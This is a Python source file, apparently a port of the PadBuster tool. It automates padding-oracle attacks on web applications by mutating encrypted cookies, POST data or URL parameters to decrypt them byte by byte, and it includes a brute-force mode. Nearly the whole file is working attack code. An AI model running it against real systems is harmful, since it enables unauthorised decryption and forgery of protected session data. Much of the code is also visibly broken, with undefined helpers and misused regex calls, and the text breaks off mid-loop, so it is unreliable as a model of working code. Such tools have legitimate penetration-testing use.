import sys
import re
import argparse
import os
import base64
import requests
from requests.auth import HTTPBasicAuth
from requests.exceptions import HTTPError
import time
import colorama #from colorama import Fore, Back, Style
import random
import binascii
import threading
import concurrent.futures
import warnings
import urllib
import datetime
import logging
import zlib
                        
# PadBusterPy v1.0 - Automated script for performing Padding Oracle attacks using Python
# Ajay Kumar Guttikonda - Ported the original Padbuster.pl to Python as is.
# Native author of padbuster in perl
# Brian Holyfield - Gotham Digital Science (labs@gdssecurity.com)
#
# Credits to J.Rizzo and T.Duong for providing proof of concept web exploit
# techniques and S.Vaudenay for initial discovery of the attack. Credits also
# to James M. Martin (research@esptl.com) for sharing proof of concept exploit
# code for performing various brute force attack techniques, and wireghoul (Eldar 
# Marcussen) for making code quality improvements. 

# Set defaults
complete = 0
repeat = 0
autoRetry = 0
hasHit = 0
matchFound = False
returnValue =bytes()
signatureDataglobal = {}
testBytesglobal = {}
buildtestBytes = bytearray()
contentglobal = {}
falsePositiveDetector = 0
requestTracker = 0
analysisMode = 2 #initializing to some random number other than 0 or 1

# These are file related variables
dirName = "PadBusterPy." + str(datetime.datetime.now().strftime("%d%b%Y_%H%M%S"))
dirSlash = "/"
dirCmd = "mkdir "

if os.name == 'nt':
    dirSlash = "\\"
    dirCmd = "md "

dirExists = 0
myPrintStats = 0
timeTracker = 0

def proxy_type(v):

    """ Match IP:PORT or DOMAIN:PORT in a losse manner """
    proxies = []
    if re.match(r"((http|socks5):\/\/.)?(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}):(\d{1,5})", v):
        proxies.append({"http": v,
                        "https": v})
        return proxies
    elif re.match(r"((http|socks5):\/\/.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}:(\d{1,5})", v):
        proxies.append({"http": v,
                        "https": v})
        return proxies
    elif is_proxy_list(v, proxies):
        return proxies
    else:
        raise argparse.ArgumentTypeError(
            "Proxy should follow IP:PORT or DOMAIN:PORT format")

# Disable SSL related warnings
warnings.filterwarnings('ignore')

parser = argparse.ArgumentParser(usage='\n%(prog)s URL EncryptedSample BlockSize [optional arguments]',epilog='This program may have bugs. Please report or provide the solution in github so it will help others.')

#Obligatory
parser.add_argument('Url', nargs='?',help='The target URL (and query string if applicable)')
parser.add_argument('sample', help='The encrypted value/sample you want to test. Must\
                           also be present in the URL, PostData or a Cookie', nargs='?',default='')
parser.add_argument('blockSize', nargs='?',help='The block size being used by the algorithm',type=int)

# Options
parser.add_argument('-l', '--log', help='Generate log files (creates folder PadBuster.DDMMYY)', dest='logFiles',default=True,type=bool)
parser.add_argument('-p', '--post', help='[Post Data]: HTTP Post Data String', dest='post', default=None)
parser.add_argument('-e', '--encoding', help='[0-4]: Encoding Format of Sample (Default 0) \
                          0=Base64, 1=Lower HEX, 2=Upper HEX \
                          3=.NET UrlToken, 4=WebSafe Base64', dest='encoding', default=0, type=int) #choices=['csv', 'json']
parser.add_argument('-hd', '--headers', help='[HTTP Headers]: Custom Headers (name1::value1;name2::value2)', dest='headers',action='store_true')
parser.add_argument('-c', '--cookies', help='[HTTP Cookies]: Cookies (name1=value1; name2=value2)', dest='cookie')
parser.add_argument('-er', '--error', help='[Error String]: Padding Error Message', dest='error')
parser.add_argument('-t', '--threads', help='number of threads.Default is 10.', dest='threads',default=10, type =int)
parser.add_argument('-pr', '--prefix', help='[Prefix]: Prefix bytes to append to each sample (Encoded)',dest='prefix')
parser.add_argument('-i', '--intermediate', help='[Bytes]: Intermediate Bytes for CipherText (Hex-Encoded)', dest='intermediaryInput',action='store_true')
parser.add_argument('-ct', '--ciphertext', help='[Bytes]: CipherText for Intermediate Bytes (Hex-Encoded)', dest='cipherInput') 
parser.add_argument('-pt', '--plaintext', help='[String]: Plain-Text to Encrypt', dest='plainTextInput')
parser.add_argument('-et', '--encodedtext', help='[Encoded String]: Data to Encrypt (Encoded)', dest='encodedPlainTextInput')
parser.add_argument('-ne', '--noencode', help='Do not URL-encode the payload (encoded by default)', dest='noEncodeOption')
parser.add_argument('-vv', '--veryverbose', help='Very Verbose (Debug Only) output', dest='superVerbose',type=bool)
parser.add_argument('-px', '--proxy', help='Proxy server IP:PORT or DOMAIN:PORT', dest='proxies',type=proxy_type)
parser.add_argument('-pxu', '--proxyauth', help='Proxy server IP:PORT or DOMAIN:PORT', dest='proxyAuth')
parser.add_argument('-ni', '--noiv', help='Sample does not include IV (decrypt first block) ', dest='noIv')
parser.add_argument('-a', '--auth', help='[username:password]: HTTP Basic Authentication ', dest='auth')
parser.add_argument('-r', '--resume', help='[Block Number]: Resume at this block number', dest='resumeBlock')
parser.add_argument('-in', '--interactive', help='Prompt for confirmation on decrypted bytes', dest='interactive')
parser.add_argument('-bf', '--bruteforce', help='Perform brute force against the first block ', dest='bruteForce')
parser.add_argument('-ic', '--ignorecontent', help='No help Yet', dest='ignoreContent')
parser.add_argument('-ub', '--usebody', help='Use response body content for response analysis phase', dest='useBody')
parser.add_argument('-v', '--verbose', help='verbose output', dest='verbose',type=bool)
parser.add_argument('-rr', '--randomcolors', help='verbose output with random colors', dest='randomcolors',type=bool)
args = parser.parse_args()

if args.randomcolors:
    colorama.init()
    colors = list(vars(colorama.Fore).values())
    print(colorama.Fore.YELLOW + colorama.Back.WHITE + colorama.Style.BRIGHT)

try:
    from urllib.parse import urlparse  #For Python 3
except ImportError:
    #print(''.join(random.choice(colors) + char for char in 'PadBusterPy is built on Python 3.8.2 and hopefully runs on Python 3 and above.'))
    print('Error: PadBusterPy is built on Python 3.8.2 and hopefully runs on Python 3 and above.')
    exit()

if not args.randomcolors:
    print(colorama.Style.RESET_ALL)

if not args.interactive:
    interactive = 0

print( "\n+-------------------------------------------+\n")
print( "| PadBusterPy - v1.0                         |\n")
print( "| Ported to python by Ajay Kumar Guttikonda  |\n")
print( "| Native in perl by Brian Holyfield - Gotham Digital Science  |\n")
print( "| https://github.com/AonCyberLabs/PadBuster  |\n")
print( "+-------------------------------------------+\n")

def pretty_print_POST(req):
    myPrint('\n{}\r\n{}\r\n\r\n{}'.format(

        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()),
        req.body,
    ),0)

def sxor(s1, s2):
    return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def byte_xor(ba1, ba2):
    return bytes([a ^ b for a, b in zip(ba1, ba2)])

def myPrint(PrintData, PrintLevel):
    if (args.verbose and PrintLevel > 0) or PrintLevel < 1 or args.superVerbose:
        if threading.current_thread().name == 'MainThread':
            print(PrintData,end='\n')
        else:
            print(threading.current_thread().name, PrintData, end='\n')
        writeFile("ActivityLog.txt", PrintData)

if not args.Url or not args.sample or not args.blockSize:
    parser.print_help()
    exit()

def sleeptracker(time2sleep,message):
    for remtime in range(time2sleep, -1, -1):
        sys.stdout.write("\r")
        sys.stdout.write(message + " {:2d} seconds.".format(remtime))
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("\r\n")

def to_high_nibble_hex(value,oper):
    """Convert a binary string to hex using high-nibble first encoding
    oper =0 to hex , 1 to unhex
    """
    _translation = bytes(((0xf0 & c) >> 4 | (0x0f & c) << 4) for c in range(256))
    if oper == 0:
        return binascii.hexlify(value.translate(_translation))
    elif oper == 1:
        return binascii.unhexlify(value.translate(_translation))
    else:
        return None

def is_good_proxy(pip):
    try:
        requests.get('http://example.com', proxies=pip, timeout=3)
    except requests.exceptions.ConnectTimeout as e:
        return False
    except Exception as detail:
        return False
    return True

def prepRequest(pUrl, pPost, pCookie, pSample, pTestBytes):

    # Prepare the request
    testUrl = pUrl
    wasSampleFound = 0

    if args.superVerbose:
        myPrint("INFO: pUrl:" + pUrl, 0)
        myPrint("INFO: pCookie:" + pCookie, 0)
        myPrint("INFO: pPost:" + str(pPost), 0)
        myPrint("INFO: pSample:" + pSample, 0)
        myPrint("INFO: pTestBytes:" + str(pTestBytes), 0)

    if pSample in pUrl:
        testUrl  = testUrl.replace(pSample,pTestBytes)
        wasSampleFound = 1

    testPost = ""
    if pPost:
        testPost = pPost
        if pSample in pPost:
            testPost  = testPost.replace(pSample,pTestBytes,1)
            wasSampleFound = 1

    testCookies = ""
    if pCookie:
        testCookies = pCookie
        if pSample in pCookie:
            testCookies  = testCookies.replace(pSample,urllib.parse.quote(pTestBytes),1)
            wasSampleFound = 1

    if args.superVerbose:
        myPrint("INFO:testCookies:" + testCookies, 0)

    if wasSampleFound == 0:
        myPrint("ERROR: Encrypted sample was not found in the test request",0)
        exit()

    return testUrl, testPost, testCookies

def makeRequest(method, url, data='', cookie=""):

    numRetries,noConnect = 0,0
    status, content, location, contentLength ="","","",0

    globals()['requestTracker'] += 1

    while noConnect == 0 or numRetries >= 15:

        fullheaders = {}

        body = {
            #"name": "ajay"
        }  # JSON body goes here.

        # Add request content for POST and PUTS
        if data:
            fullheaders['Content-Type'] = "application/x-www-form-urlencoded"

        # if proxy:
        #     proxyUrl = "http://"
        #
        #     if proxyAuth:
        #         proxyUser, proxyPass = re.findall(r':', proxyAuth)
        #         ENV{HTTPS_PROXY_USERNAME}	 = proxyUser
        #         ENV{HTTPS_PROXY_PASSWORD}	 = proxyPass
        #         proxyUrl .= proxyAuth."@"
        #
        #     proxyUrl += proxy
        #     lwp->proxy(['http'], "http://".proxy)
        #     ENV{HTTPS_PROXY} = "http://".proxy

        auth = ()
        if args.auth:
            httpuser, httppass = re.findall(r':', args.auth)
            auth = HTTPBasicAuth(httpuser, httppass)

        # If cookies are defined, add a COOKIE header
        if cookie:
            fullheaders['Cookie'] = cookie
        elif args.cookie:
            fullheaders['Cookie'] = args.cookie

        if args.headers:
            customHeaders = re.findall(r';', args.headers)
            for i in range(0, length(customHeaders)):
                headerName, headerVal = re.findall(r'::', customHeaders[i])
                fullheaders[headerName] = headerVal

        startTime = time.time()
        req = requests.Request(method.upper(), url, headers=fullheaders, data=body, auth=auth)
        prepared = req.prepare()

        if args.superVerbose:
            pretty_print_POST(prepared)
            if not fullheaders:
                myPrint("fullheaders:\n" + str(fullheaders),0)

        s = requests.Session()

        try:
            if args.proxies:
                response = s.send(prepared, proxies=proxies, verify=False, allow_redirects=True,timeout=15) #,stream=True)
            else:
                response = s.send(prepared, allow_redirects=False,timeout=15)

            if args.superVerbose:
                myPrint(response.headers, 0)
                myPrint(response.text, 0)

            # Extract the required attributes from the response
            status = response.status_code
            content = response.content

            location = response.headers.get("Location", "N/A")

            contentLength = len(content)
            contentEncoding = response.headers.get("Content-Encoding", '')

            if args.superVerbose:
                myPrint("contentLength is:" + str(contentLength), 0)
                myPrint("contentEncoding is:" + str(contentEncoding), 0)

            if contentEncoding:
                if "GZIP" in contentEncoding:
                    try:
                        content = zlib.decompress(content)
                        contentLength = len(content)
                    except zlib.error as e:
                        myPrint("Failure",0)

            if args.superVerbose:
                myPrint("Response Content:\n" + str(content), 0)

            noConnect = 1
            globals()['totalRequests'] += 1
        except requests.exceptions.ConnectionError as connErr:
            myPrint("ConnectionError: 500 Can't connect to " + args.Url + " (Connection refused)",0)
            noConnect = 0
            numRetries += 1
            sleeptracker(10,"Retrying in")
        except requests.exceptions.HTTPError as httpErr:
            myPrint("Http Error:" + type(httpErr).__name__,0)
            noConnect = 0
            globals()['totalRequests'] += 1
        except Exception as e:
            myPrint("Generic ERROR: " + type(e).__name__ + "to " + args.Url,0)
            myPrint(e,0)
            noConnect = 0
            numRetries += 1
            sleeptracker(10,"Retrying in")
        else:
            if args.superVerbose:
                myPrint('Success!',0)

        endTime = time.time()
        globals()['timeTracker'] = globals()['timeTracker'] + (endTime - startTime)

        if myPrintStats == 1 and globals()['requestTracker'] % 250 == 0:
            myPrint("[+] $requestTracker Requests Issued (Avg Request Time: ", (globals()['timeTracker'] / 100), ")",0)
            globals()['timeTracker'] = 0

        if numRetries >= 5:
            myPrint("ERROR: Number of retries has exceeded " + str(numRetries) + " attempts...Cant waste more of your time...quitting.\n", 0)
            exit()

    return status, content, location, contentLength

def FnEncodeDecode(toEncodeDecode, oper, lformat):
    # Oper: 0=Encode, 1=Decode
    # Format: 0=Base64, 1 Hex Lower, 2 Hex Upper, 3=NetUrlToken

    returnVal = ""
    if lformat == 1 or lformat == 2:  # HEX
        if oper == 1:
            # Decode #Always convert to lower when decoding
            toEncodeDecode = toEncodeDecode.lower()
            returnVal = toEncodeDecode.decode('hex')  # to_high_nibble_hex(toEncodeDecode,0)
        else:  # Encode
            returnVal = binascii.hexlify(toEncodeDecode).decode()
            if lformat == 2:  # Uppercase
                returnVal = returnVal.upper()
    elif lformat == 3: # NetUrlToken
        if oper == 1:
            returnVal = web64Decode(toEncodeDecode, 1)
        else:
            returnVal = web64Encode(toEncodeDecode, 1)
    elif lformat == 4: # Web64
        if oper == 1:
            returnVal = web64Decode(toEncodeDecode, 0)
        else:
            returnVal = web64Encode(toEncodeDecode, 0)
    else: # B64
        if oper == 1:
             returnVal = base64.b64decode(toEncodeDecode)
        else:
            returnVal = base64.b64encode(toEncodeDecode)
            returnVal = returnVal.decode()
            if args.superVerbose:
                myPrint("INFO: b64encode returnVal:" + str(returnVal), 0)
    return returnVal

def web64Encode(input1, net):
    # net: 0=No Padding Number, 1=Padding (NetUrlToken)
    myPrint("Encoding:",input1)
    input1 = base64.encodebytes(bytes(input1,'utf-8'))
    myPrint("Encoded:", input1)
    input1 = re.sub(r'(\r|\n)', '', input1)
    input1 = re.sub(r'\+', '\-', input1)
    input1 = re.sub('\/', '\_', input1)
    input1 = input1 + input1.count("=")
    return input1

def web64Decode(input1, net):
    # net: 0=No Padding Number, 1=Padding (NetUrlToken)
    input1 = re.sub(r'\-', '\+', input1)
    input1 = re.sub(r'\_', '\/', input1)
    if net == 1:
        input1 = input1.replace(input1[-1], "=")
    myPrint("Decoding:",input1)
    input1 = base64.decodebytes(bytes(input1,'utf-8'))
    myPrint("Decoded:", input1)
    return input1

def promptUser(prompt, pdefault="", yn="", rng=0):
    if pdefault:
        defaultValue = "[default]"
    else:
        defaultValue = ""

    try:
        inputvalue = input(prompt + defaultValue + ":")

        if not inputvalue:
            inputvalue = pdefault

        if yn:
            if inputvalue in ('y', 'n', 'a'):
                return inputvalue
            else:
                promptUser(prompt, pdefault, yn,rng)
        else:
            inputvalue = int(inputvalue)
            if inputvalue > 0 and inputvalue < 256 and inputvalue <= rng:
                return inputvalue
            else:
                promptUser(prompt, pdefault, yn,rng)
    except ValueError:
        myPrint("ERROR: Please enter the value as required", 0)
        promptUser(prompt, pdefault, yn, rng)

def writeFile(fileName, fileContent):
    if args.logFiles:
        if globals()['dirExists'] != 1:
            try:
                fileName = globals()['dirName'] + globals()['dirSlash'] + fileName
                os.makedirs(globals()['dirName'])
                globals()['dirExists'] = 1
                logging.basicConfig(filename=fileName, filemode='w', level=logging.INFO)
            except OSError as e:
                if e.errno != errno.EEXIST:
                    raise
        try:
            logging.info(fileContent)
        except Exception as e:
            pass

def FnEncode(toEncode, lformat):
    return FnEncodeDecode(toEncode, 0, lformat)

def FnDecode(toDecode, lformat):
    return FnEncodeDecode(toDecode, 1, lformat)

def determineSignature():

    # Help the user detect the oracle response if an error string was not provided
    # This logic will automatically suggest the response pattern that occured most often
    # during the test as this is the most likeley one

    sortedGuesses = sorted(globals()['oracleGuesses'])
    globals()['oracleCandidates'] = sorted(globals()['oracleCandidates'])

    if args.superVerbose:
        myPrint("oracleCandidates" + str(globals()['oracleCandidates']), 0)

    myPrint("The following response signatures were returned:\n",0)
    myPrint("-------------------------------------------------------", 0)
    if args.useBody:
        myPrint("ID#\tFreq\tStatus\tLength\tChksum\tLocation",0)
    else:
        myPrint("ID#\tFreq\tStatus\tLength\tLocation",0)
    myPrint("-------------------------------------------------------", 0)

    id = 1
    for keys in sortedGuesses:
        #print(keys)
       # print(values)
        line = str(id)
        if id != 1:
            line += " **"
        else:
            line += " "

        line += "\t" + str(oracleGuesses[keys]) + "\t" + keys

        if args.useBody:
            line += "\t" + to_high_nibble_hex('%32A*', sigFields[3] )

        myPrint(line,0)
        writeFile("Response_Analysis_Signature_" + str(id) + ".txt", globals()['responseFileBuffer'][keys])
        id += 1
    myPrint("-------------------------------------------------------", 0)

    if len(sortedGuesses) == 0 and not args.bruteForce:
        myPrint("\nERROR: All of the responses were identical.\n", 0)
        myPrint("Double check the Block Size and try again.", 0)
        exit()
    else:
        responseNum = promptUser(prompt="\nEnter an ID that matches the error condition\n"
                                 "NOTE: The ID# marked with ** is recommended",rng=len(sortedGuesses))
        myPrint("\nContinuing test with selection:" + str(responseNum) + "\n",0)
        try:
            globals()['oracleSignature'] = globals()['oracleCandidates'][responseNum-1]
            if args.superVerbose:
                print('globals()[oracleSignature]:' + str(globals()['oracleSignature']))
        except Exception as e:
            responseNum = promptUser(prompt="\nEnter an ID that matches the error condition\nNOTE: The ID# marked with ** is recommended")

def processSubBlock(byteNum,testBytes, sampleBytes, startcntr):
    global hasHit, autoRetry, falsePositiveDetector, contentglobal, testBytesglobal, matchFound, signatureDataglobal, repeat

    for i in range(startcntr, startcntr-1, -1):
        # Fuzz the test byte
        testBytes = testBytes[:byteNum] + bytearray([i]) + testBytes[byteNum+1:]

        #Store testBytes for analysis
        testBytesglobal[i] =testBytes

        if args.superVerbose:
            myPrint("Amended testBytes:" + str(testBytes), 0)
            myPrint("Length of Amended testBytes:" + str(len(testBytes)), 0)
            myPrint("Going to add sampleBytes:" + str(sampleBytes), 0)

        # Combine the test bytes and the sample
        combinedTestBytes = testBytes + sampleBytes

        if args.superVerbose:
            myPrint("Before Encoding combinedTestBytes:" + str(combinedTestBytes), 0)
            myPrint("Length amended combinedTestBytes:" + str(len(combinedTestBytes)), 0)

        if args.prefix:
            combinedTestBytes = FnDecode(args.prefix, globals()['encodingFormat']) + combinedTestBytes

        combinedTestBytes = FnEncode(combinedTestBytes, globals()['encodingFormat'])

        if not args.noEncodeOption:
            combinedTestBytes = re.escape(combinedTestBytes)

        testUrl, testPost, testCookies = prepRequest(args.Url, args.post, args.cookie, args.sample, combinedTestBytes)

        # Ok, now make the request
        if args.superVerbose:
            myPrint("INFO: Ok, now make the request\n", 0)

        status, content, location, contentLength = makeRequest(method, testUrl, testPost, testCookies)

        #Store content for analysis
        contentglobal[i] = content

        signatureData = str(status) + "\t" + str(contentLength) + "\t" + location

        if args.superVerbose:
            myPrint("signatureData:" + signatureData, 0)

        if args.useBody:
            signaturData = signatureData + "\t" + content

        #Store the signature data globally for analysis
        signatureDataglobal[i] = signatureData

        # If this is the first block and there is no padding error message defined, then cycle through
        # all possible requests and let the user decide what the padding error behavior is.
        if globals()['analysisMode'] == 0:
            if i == 255:
                myPrint("INFO: No error string was provided...starting response analysis at " +\
                        str(datetime.datetime.now().strftime("%d%b%Y %H:%M:%S")) + " ***\n", 0)
            try:
                globals()['oracleGuesses'][signatureData] += 1
                if signatureData not in globals()['oracleCandidates']:
                    globals()['oracleCandidates'].append(signatureData)
            except Exception as e:
                globals()['oracleGuesses'][signatureData] = 1
                globals()['oracleCandidates'].append(signatureData)

            globals()['responseFileBuffer'][signatureData] = "URL:" + testUrl+ "\nPost Data:" + testPost + "\nCookies:"\
                                                + testCookies + "\n\nStatus:" + str(status) + "\nLocation:"\
                                                + location + "\nContent-Length:" + str(contentLength) + "\nContent:\n" + str(content)

            if byteNum == args.blockSize - 1 and i == 0:
                myPrint("*** Response Analysis Completed at " + str(datetime.datetime.now().strftime("%d%b%Y %H:%M:%S")) + " ***\n", 0)
                if args.superVerbose:
                    print(globals()['oracleCandidates'])
                    print(globals()['oracleGuesses'])
                determineSignature()
                globals()['analysisMode'] = 1
                #repeat = 1
                return byteNum-1

def analyseBlock(byteNum, sampleBytes):

    global hasHit, autoRetry, falsePositiveDetector, testBytesglobal, matchFound, buildtestBytes,returnValue,repeat

    if args.superVerbose:
        for keys,values in testBytesglobal.items():
            print(keys,"-",values)

    if args.superVerbose:
        myPrint("Total Signaturedata:" + str(len(signatureDataglobal)), 0)
        myPrint("Total testBytesglobal:" + str(len(testBytesglobal)), 0)
        myPrint("oracleSignature:" + globals()['oracleSignature'], 0)

    continue1 = "y"
    for i in range(255, -1, -1):
        if args.superVerbose:
            myPrint("Inside Suxs/Failure:" + signatureDataglobal[i], 0)
            myPrint("Inside Suxs/Failure:" + str(globals()['oracleSignature'][0]), 0)
            myPrint("Inside Suxs/Failure:" + str(contentglobal[i]), 0)

        if (args.error and args.error in contentglobal[i]) or (globals()['oracleSignature']):
            # This is for auto retry logic (only works on the first byte)
            if globals()['oracleSignature'] != signatureDataglobal[i]:

                if autoRetry == 1 and byteNum == args.blockSize - 1 and hasHit == 0:
                        hasHit += 1
                else:
                    # If there was no padding error, then it worked
                    myPrint("[+] Success: (" + str(abs(i-256)) + "/256) [Byte " + str(byteNum+1) + "]", 0)
                    myPrint("[+] Test Byte:" + str(re.escape(testBytesglobal[i][byteNum:byteNum+1])), 1)

                    # If continually getting a hit on attempt zero, then something is probably wrong
                    if i == 255:
                        falsePositiveDetector += 1

                    if globals()['interactive'] == 1:
                        continue1 = promptUser(prompt="Do you want to use this value (Yes/No/All)? [y/n/a]", pdefault="", yn=1 )

                    if continue1 == "y" or continue1 == "a":
                        if continue1 == "a":
                            globals()['interactive'] = 0

                        # Next, calculate the decrypted byte by XORing it with the padding value

                        # These variables could allow for flexible padding schemes (for now PCKS)
                        # For PCKS#7, the padding block is equal to chr($blockSize - $byteNum)
                        currentPaddingByte = bytearray([args.blockSize - byteNum])
                        nextPaddingByte = bytearray([args.blockSize - byteNum + 1])

                        decryptedByte = byte_xor(testBytesglobal[i][byteNum:byteNum+1], currentPaddingByte)
                        myPrint("[+] XORing with Padding Char, which is " + str(re.escape(currentPaddingByte)), 1)

                        returnValue = decryptedByte + returnValue
                        myPrint("[+] Decrypted Byte is: " + str(re.escape(decryptedByte)), 1)
                        if not matchFound:
                            myPrint("[+] Match Found",0)
                            matchFound = True
                            # Finally, update the test bytes in preparation for the next round, based on the padding used
                            for k in range(byteNum, args.blockSize, 1):
                                # First, XOR the current test byte with the padding value for this round to recover the decrypted byte
                                testBytesglobal[i] = testBytesglobal[i][:k] + byte_xor(testBytesglobal[i][k:k+1], currentPaddingByte) + testBytesglobal[i][k+1:]

                                # Then, XOR it again with the padding byte for the next round
                                testBytesglobal[i] = testBytesglobal[i][:k] + byte_xor(testBytesglobal[i][k:k+1], nextPaddingByte) + testBytesglobal[i][k+1:]
                                buildtestBytes = testBytesglobal[i]
                        return byteNum-1

        ## TODO: Combine these two blocks?
        if i == 0 and globals()['analysisMode'] == 1:
            # End of the road with no success.  We should probably try again.
            myPrint("ERROR: No matching response on [Byte " + str((byteNum+1)) + "]", 0)
            if autoRetry == 0:
                autoRetry = 1
                myPrint("Automatically trying one more time...", 0)
                repeat = 1
                return byteNum
            else:
                if byteNum == args.blockSize - 1 and args.error:
                    myPrint("\nAre you sure you specified the correct error string?", 0)
                    myPrint("Try re-running without the -e option to perform a response analysis.\n", 0)

                continue1 = promptUser(prompt="Do you want to start this block over? (Yes/No)? [y/n/a]", yn=1)
                if continue1 != "n":
                    myPrint("INFO: Switching to interactive mode and superVerbose Mode", 0)
                    globals()['interactive'] = 1
                    args.superVerbose = True
                    repeat = 1
                    return byteNum

        if falsePositiveDetector == args.blockSize:

            myPrint("\n*** ERROR: It appears there are false positive results. ***\n", 0)
            myPrint("HINT: The most likely cause for this is an incorrect error string.\n", 0)

            if error:
                myPrint("[+] Check the error string you provided and try again, or consider running", 0)
                myPrint("[+] without an error string to perform an automated response analysis.\n", 0)
            else:
                myPrint("[+] You may want to consider defining a custom padding error string", 0)
                myPrint("[+] instead of the automated response analysis.\n", 0)

            continue1 = promptUser(prompt="Do you want to start this block over? (Yes/No)? [y/n/a]", yn= 1)
            if continue1 == "y":
                myPrint("INFO: Switching to interactive mode and superVerbose Mode", 0)
                globals()['interactive'] = 1
                args.superVerbose = True
                repeat = 1
                return byteNum
            return byteNum - 1

def processBlock(sampleBytes):

    global complete, autoRetry, hasHit, falsePositiveDetector, testBytesglobal, matchFound, buildtestBytes, returnValue, repeat

    # Analysis mode is either 0 (response analysis) or 1 (exploit)
    if not args.error and not globals()['oracleSignature']:
        globals()['analysisMode'] = 0
    else:
        globals()['analysisMode'] = 1

    # The return value of this subroutine is the intermediate text for the block
    complete = 0
    autoRetry = 0
    hasHit = 0
    while complete == 0:
        # Reset the return value
        returnValue = bytearray()
        repeat = 0

        # TestBytes are the fake bytes that are pre-pending to the cipher test for the padding attack
        buildtestBytes = bytes(args.blockSize)

        falsePositiveDetector = 0

        # Work on one byte at a time, starting with the last byte and moving backwards
        if args.superVerbose:
            myPrint("Will call processSubBlock with blockSize is proper",0)
            myPrint("byte testBytes:" + str(buildtestBytes), 0)

        byteNum = args.blockSize - 1
        while byteNum >= 0:
            myPrint("\nCalling processSubBlock with:" + str(byteNum), 0)
            matchFound = False
            testBytesglobal = {}
            signatureDataglobal = {}
            contentglobal = {}
            if args.superVerbose:
                myPrint("testBytesglobal:" + str(testBytesglobal), 0)

            with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
                futureBlocks = {executor.submit(processSubBlock, byteNum,buildtestBytes,\
                                                 sampleBytes, strcntr):\
                               strcntr for strcntr in range(255, 0, -1)}
                while futureBlocks:
                    done, futureBlocks = concurrent.futures.wait(futureBlocks, timeout=None,\
                                                                 return_when=concurrent.futures.ALL_COMPLETED)
            processSubBlock(byteNum,buildtestBytes, sampleBytes,0)
            byteNum = analyseBlock(byteNum, sampleBytes)

        if repeat == 1:
            complete = 0
        else:
            complete = 1
    return returnValue

proxies = []
if args.proxies:
    myPrint("%s Testing proxies, can take a while..." % info)
    for proxy in args.proxies:

        if is_good_proxy(proxy):
            proxies.append(proxy)
        else:
            myPrint("%s Proxy %s doesn't seem to work or timedout" % (bad, proxy['http']))
    myPrint("%s Done" % info)

    if not proxies:
        myPrint("%s no working proxies, quitting!" % bad)
        exit()
else:
    proxies.append(None)

if args.post:
    method = "POST"
else:
    method = "GET"

if args.encoding < 0 or args.encoding > 4:
    myPrint("\nERROR: Encoding must be a value between 0 and 4")
    exit()

if args.encoding:
    encodingFormat = args.encoding
else:
    encodingFormat = 0

encryptedBytes = args.sample
totalRequests = 0

# See if the sample needs to be URL decoded, otherwise don't (the plus from B64 will be a problem)

if args.superVerbose:
    myPrint("encryptedBytes/sample before URL decoding:" + str(encryptedBytes),0)

if '%' in encryptedBytes:
    encryptedBytes = urllib.parse.unquote(encryptedBytes)

if args.superVerbose:
    myPrint("encryptedBytes/sample after URL decoded:" + str(encryptedBytes),0)
    myPrint("args.sample:" + args.sample, 0)
    myPrint(re.escape(args.sample), 0)

# Prep the sample for regex use
args.sample = re.escape(args.sample)

# Now decode
encryptedBytes = FnDecode(encryptedBytes, encodingFormat)
if args.superVerbose:
    myPrint("Decoded encryptedBytes:" + str(encryptedBytes),0)

if (len(encryptedBytes) % args.blockSize) > 0:
    myPrint("\nERROR: Encrypted Bytes must be evenly divisible by Block Size (blockSize)",0)
    myPrint("Encrypted sample length is " + str(len(encryptedBytes)) + "+ Double check the Encoding and Block Size+",0)
    exit()

# If no IV, then append nulls as the IV (only if decrypting)
    if args.noIv and not args.bruteForce and not args.plainTextInput:
        encryptedBytes = bytes(args.blockSize) + encryptedBytes

# PlainTextBytes is where the complete decrypted sample will be stored (decrypt only)
plainTextBytes = bytearray()

# This is a bool to make sure we know where to replace the sample string
wasSampleFound = 0

# ForgedBytes is where the complete forged sample will be stored (encrypt only)
# Isolate the IV into a separate byte array
if args.superVerbose:
    myPrint("IV:" + str(encryptedBytes[0:args.blockSize]),0)
ivBytes = encryptedBytes[0:args.blockSize]

# Declare some optional elements for storing the results of the first test iteration
# to help the user if they don't know what the padding error looks like

oracleCandidates = []
oracleSignature = []
oracleGuesses = {}  # This is a hash type
responseFileBuffer = {}  # This is a hash type

# The block count should be the sample divided by the blocksize
blockCount = int(int(len(encryptedBytes)) / int(args.blockSize))
if args.superVerbose:
    myPrint("blockCount:" + str(blockCount), 0)

if not args.bruteForce and not args.plainTextInput and blockCount < 2:
    myPrint("\nERROR: There is only one block. Try again using the -noiv option.",0)
    exit()

# The attack works by sending in a real cipher text block along with a fake block in front of it
# You only ever need to send two blocks at a time (one real one fake) and just work through
# the sample one block at a time

# First, re-issue the original request to let the user know if something is potentially broken
status, content, location, contentLength = makeRequest(method, args.Url, args.post, args.cookie)

myPrint("\nINFO: The original request returned the following",0)
myPrint("[+] Status: " + str(status),0)
myPrint("[+] Location: " + location,0)
myPrint("[+] Content Length: " + str(contentLength),0)
myPrint("[+] Response: " + str(content) + "\n",1)

if args.encodedPlainTextInput:
    plainTextInput = FnDecode(args.encodedPlainTextInput,encodingFormat)

if args.bruteForce:
    myPrint("INFO: Starting PadBuster Brute Force Mode",0)
    bfAttempts = 0
    if args.resumeBlock:
        myPrint("INFO: Resuming previous brute force at attempt resumeBlock\n", 0)

# Only loop through the first 3 bytes...this should be enough as it requires 16.5M+ requests

    bfSamples =[]
    sampleString = bytes(2)

    for x in range(256):
        substr(sampleString, 0, 1, chr(x))
        for y in range(256):
            substr(sampleString, 0, 1, chr(y))
            bfSamples.append(sampleString)

    for testVal in bfSamples:
        complete = 0
        while complete == 0:
            repeat = 0
            for b in range(256):
                bfAttempts += 1

                if (args.resumeBlock and (bfAttempts < (args.resumeBlock - (args.resumeBlock % 256)+1))):
                    pass
                else:

                    testBytes = bytearray([b]) + testVal
                    testBytes += bytes(args.blockSize-3)

                    combinedBf = testBytes
                    combinedBf += encryptedBytes
                    combinedBf = myEncode(combinedBf, args.encoding)

                    # Add the Query String to the URL
                    testUrl, testPost, testCookies = prepRequest(url, post, cookie, sample, combinedBf)

                    # Issue the request
                    (status, content, location, contentLength) = makeRequest(method, testUrl, testPost, testCookies)

